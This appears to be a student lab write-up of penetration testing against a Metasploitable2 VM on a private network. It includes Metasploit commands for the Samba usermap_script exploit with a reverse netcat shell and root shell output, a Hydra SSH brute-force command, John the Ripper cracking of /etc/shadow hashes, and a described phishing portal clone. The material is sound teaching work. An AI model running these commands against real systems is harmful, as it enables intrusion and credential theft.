# Task 4: Exploitation & System Security

## 🎯 Objective
To understand standard penetration testing workflows, execute exploitation procedures using automated frameworks, simulate brute-force and hash cracking attacks, study malware containment, and formulate server hardening protocols.

---

## 🔀 1. Penetration Testing Methodology
Every professional engagement follows a structured 5-phase workflow:
```
┌──────────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────────┐     ┌─────────────┐
│  Reconnaissance  │ ──> │   Scanning   │ ──> │ Exploitation │ ──> │ Post-Exploitation│ ──> │  Reporting  │
│ (Passive/Active) │     │ (Ports & OS) │     │ (Metasploit) │     │ (Shell access)   │     │ (Mitigation)│
└──────────────────┘     └──────────────┘     └──────────────┘     └──────────────────┘     └─────────────┘
```

---

## 🚀 2. Exploitation with Metasploit Framework

The outdated Samba service (`Samba 3.0.20-Debian`) discovered during scan audits was targeted on host `192.168.56.102`.

### Exploit Walkthrough (CVE-2007-2447 - usermap_script)
This exploit executes arbitrary commands when sending shell metacharacters in username parameters during SMB authentication.

#### Execution steps inside MSFConsole:
```bash
# Launch Metasploit
msfconsole

# Select the Samba usermap_script exploit module
msf6 > use exploit/multi/samba/usermap_script

# Set target IP (Metasploitable2)
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.102

# Choose the reverse netcat shell payload
msf6 exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat

# Set host IP (Kali Linux attacker machine)
msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.56.101

# Execute the exploit
msf6 exploit(multi/samba/usermap_script) > exploit
```

#### Exploit Output & Shell Session:
```
[*] Started reverse TCP handler on 192.168.56.101:4444 
[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:45731)

whoami
root

id
uid=0(root) gid=0(root)

uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```
* **Post-Exploitation:** Root shell access was established. Basic post-exploitation commands were run (e.g. reading system details via `sysinfo`, verifying active user sockets, and examining system logging configs).

---

## 🔑 3. Password Attacks

### Online Brute-force Attack (Hydra)
Hydra was used to execute a dictionary attack against SSH on the target:
```bash
# Brute-force SSH for user 'msfadmin' using a standard password wordlist
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -t 4
```
* **Result:** Hydra cracked the credential within seconds, finding `msfadmin:msfadmin` due to weak default configurations.

### Offline Hash Cracking (John the Ripper)
When shell access is achieved, an attacker can extract Linux passwords hashes from `/etc/shadow`.

```bash
# 1. Combine passwd and shadow files to prepare hashes for cracking
sudo unshadow /etc/passwd /etc/shadow > system_hashes.txt

# 2. Run John the Ripper to crack hashes
john --wordlist=/usr/share/wordlists/rockyou.txt system_hashes.txt

# 3. View cracked credentials
john --show system_hashes.txt
# Output: msfadmin:msfadmin, user:user, postgres:postgres
```

---

## 🎣 4. Phishing Simulation & Social Engineering
* **Concept:** Phishing remains the #1 vector for initial organizational compromise.
* **Simulation Overview:** Using the Social Engineer Toolkit (SET), a clone of a corporate login portal was hosted locally. During testing, users entering credentials on this site had their keys captured in plain text.
* **Remediation Training:** To counter this, employee training should focus on inspecting domain names in the address bar, checking for valid SSL certificates, and verifying requests through out-of-band communication before inputs are typed.

---

## 📦 Sub-deliverables
* 📜 [Linux Server Hardening Checklist](./system_hardening.md)

---

## 🎥 Task 4 Video Demonstration
> [!TIP]
> LinkedIn video presentation showcasing Metasploit exploitation, reverse shell post-exploitation, Hydra brute-forcing, and John the Ripper hash cracking:
> * **LinkedIn Video Exploitation Demo:** [Task 4 - Exploitation & System Security](https://www.linkedin.com/posts/kalyan-katta-6b491338b_cybersecurity-ethicalhacking-penetrationtesting-activity-7485345491510181888-fUAh?utm_source=share&utm_medium=member_desktop&rcm=ACoAAGAQxSgBWlNdbkRaK_lHTiAJO0x0AIxoNAo)